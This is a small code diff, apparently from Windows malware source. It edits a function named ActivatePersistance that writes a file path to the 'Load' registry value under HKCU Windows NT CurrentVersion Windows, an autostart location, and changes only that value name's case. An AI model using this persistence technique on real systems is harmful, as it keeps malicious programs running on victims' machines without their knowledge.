@@ -31,7 +31,7 @@ BOOL ActivatePersistance()
 		return -1;
 	}
 
-	result = RegSetKeyValueW( HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\", L"Load",
+	result = RegSetKeyValueW( HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\", L"load",
 	                          REG_SZ, tempPath, MAX_PATH + 1 );
 	if ( result != ERROR_SUCCESS )
 	{
